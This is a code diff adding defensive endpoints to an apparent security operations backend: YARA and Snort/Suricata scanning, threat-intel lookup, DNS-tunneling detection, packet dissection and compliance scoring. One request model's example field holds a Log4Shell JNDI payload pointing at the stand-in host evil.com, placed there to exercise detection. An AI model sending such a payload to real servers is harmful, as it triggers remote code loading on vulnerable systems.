@@ -26,6 +26,12 @@ from ...graph.graph_algorithms import attack_graph_analytics
 from ...graph.knowledge_graph import knowledge_graph
 from ...services.soar_playbooks import soar_engine
 from ...services.forensic_analyzer import forensic_analyzer
+from ...engines.yara_engine import yara_scanner
+from ...engines.snort_engine import snort_ids
+from ...intelligence.massive_ioc_catalog import threat_catalog, IoCType
+from ...parsers.pcap_dpi_parser import dpi_analyzer
+from ...services.compliance_engine import compliance_engine
+
 
 router = APIRouter(prefix="/advanced", tags=["Advanced SOC Engines"])
 
@@ -286,3 +292,181 @@ def triage_linux_persistence(
         cron_entries=req.cron_entries,
         systemd_services=req.systemd_services,
     )
+
+
+# ----------------------------------------------------------------------
+# 8. YARA Binary Scanner Endpoints
+# ----------------------------------------------------------------------
+class YaraScanRequest(BaseModel):
+    payload: str = Field(..., json_schema_extra={"example": "LockBit 3.0 the world's fastest ransomware"})
+
+
+@router.get("/yara/rules")
+def list_yara_rules(current_user: User = Depends(current_user)):
+    """Lists all compiled YARA malware detection rules."""
+    return [
+        {
+            "name": r.meta.name,
+            "category": r.meta.category,
+            "malware_family": r.meta.malware_family,
+            "severity": r.meta.severity,
+            "threat_actor": r.meta.threat_actor,
+            "mitre_attack": r.meta.mitre_attack,
+            "description": r.meta.description,
+            "strings_count": len(r.strings),
+        }
+        for r in yara_scanner.rules
+    ]
+
+
+@router.post("/yara/scan")
+def scan_payload_yara(
+    req: YaraScanRequest,
+    current_user: User = Depends(current_user),
+):
+    """Scans payload text or decoded hex against compiled YARA malware rules."""
+    matches = yara_scanner.scan_payload(req.payload)
+    return {
+        "matched_rules_count": len(matches),
+        "matches": matches,
+    }
+
+
+# ----------------------------------------------------------------------
+# 9. Snort / Suricata IDS Inspection Endpoints
+# ----------------------------------------------------------------------
+class SnortInspectRequest(BaseModel):
+    src_ip: str = "10.0.0.5"
+    src_port: int = 54321
+    dst_ip: str = "192.168.1.100"
+    dst_port: int = 8080
+    protocol: str = "TCP"
+    payload: str = Field(..., json_schema_extra={"example": "GET /test?q=${jndi:ldap://evil.com/a} HTTP/1.1"})
+
+
+@router.get("/snort/rules")
+def list_snort_rules(current_user: User = Depends(current_user)):
+    """Lists all loaded Snort/Suricata IDS signatures."""
+    return [
+        {
+            "sid": r.sid,
+            "rev": r.rev,
+            "action": r.action,
+            "msg": r.msg,
+            "severity": r.severity,
+            "classtype": r.classtype,
+            "mitre_attack": r.mitre_attack,
+            "cve": r.cve,
+            "protocol": r.protocol,
+        }
+        for r in snort_ids.rules
+    ]
+
+
+@router.post("/snort/inspect")
+def inspect_snort_flow(
+    req: SnortInspectRequest,
+    current_user: User = Depends(current_user),
+):
+    """Evaluates packet payload against compiled Snort/Suricata signatures."""
+    alerts = snort_ids.inspect_flow(
+        src_ip=req.src_ip,
+        src_port=req.src_port,
+        dst_ip=req.dst_ip,
+        dst_port=req.dst_port,
+        proto=req.protocol,
+        payload=req.payload,
+    )
+    return {
+        "alerts_count": len(alerts),
+        "alerts": alerts,
+    }
+
+
+# ----------------------------------------------------------------------
+# 10. Threat Intelligence Repository Endpoints
+# ----------------------------------------------------------------------
+class ThreatLookupRequest(BaseModel):
+    indicator: str = Field(..., json_schema_extra={"example": "185.220.101.5"})
+    indicator_type: Optional[str] = None  # ipv4, domain, sha256, md5
+
+
+@router.post("/threat-intel/lookup")
+def lookup_threat_intel(
+    req: ThreatLookupRequest,
+    current_user: User = Depends(current_user),
+):
+    """Performs instant offline Threat Intelligence matching across IPs, domains, and hashes."""
+    ind = req.indicator.strip()
+    match = threat_catalog.lookup_ip(ind) or threat_catalog.lookup_domain(ind) or threat_catalog.lookup_hash(ind)
+    if not match:
+        return {"found": False, "indicator": ind, "details": None}
+
+    return {
+        "found": True,
+        "indicator": ind,
+        "details": match.__dict__,
+    }
+
+
+@router.get("/threat-intel/search")
+def search_threat_intel(
+    q: str = Query(..., min_length=2),
+    limit: int = Query(25, ge=1, le=100),
+    current_user: User = Depends(current_user),
+):
+    """Searches offline threat intelligence catalog by actor, malware family, or keyword."""
+    results = threat_catalog.search_all(q, limit=limit)
+    return {
+        "query": q,
+        "count": len(results),
+        "results": [r.__dict__ for r in results],
+    }
+
+
+# ----------------------------------------------------------------------
+# 11. Deep Packet Inspection (DPI) Dissector Endpoints
+# ----------------------------------------------------------------------
+class DPIDissectRequest(BaseModel):
+    packet_hex: Optional[str] = None
+    dns_query_text: Optional[str] = None
+
+
+@router.post("/dpi/dissect")
+def dissect_packet_telemetry(
+    req: DPIDissectRequest,
+    current_user: User = Depends(current_user),
+):
+    """Performs protocol dissection, entropy calculation, and TLS/DNS anomaly detection."""
+    if req.dns_query_text:
+        entropy = dpi_analyzer.calculate_shannon_entropy(req.dns_query_text)
+        is_tunneling = entropy > 3.8 and len(req.dns_query_text) > 35
+        return {
+            "query": req.dns_query_text,
+            "shannon_entropy": round(entropy, 3),
+            "length": len(req.dns_query_text),
+            "is_dns_tunneling_suspect": is_tunneling,
+            "risk_assessment": "CRITICAL_EXFILTRATION" if is_tunneling else "NORMAL_DNS_RESOLUTION",
+        }
+
+    if req.packet_hex:
+        try:
+            raw_bytes = bytes.fromhex(req.packet_hex.replace(" ", "").replace(":", ""))
+            meta = dpi_analyzer.dissect_raw_packet(raw_bytes)
+            if not meta:
+                raise HTTPException(status_code=400, detail="Unable to dissect packet structure")
+            return meta.__dict__
+        except Exception as e:
+            raise HTTPException(status_code=400, detail=f"Invalid packet hex: {str(e)}")
+
+    raise HTTPException(status_code=400, detail="Provide either packet_hex or dns_query_text")
+
+
+# ----------------------------------------------------------------------
+# 12. Regulatory & Compliance Framework Audit Endpoints
+# ----------------------------------------------------------------------
+@router.get("/compliance/audit")
+def audit_compliance_posture(current_user: User = Depends(current_user)):
+    """Calculates continuous compliance posture scores across NIST CSF, ISO 27001, PCI-DSS, HIPAA, and SOC 2."""
+    return compliance_engine.evaluate_posture({})
+
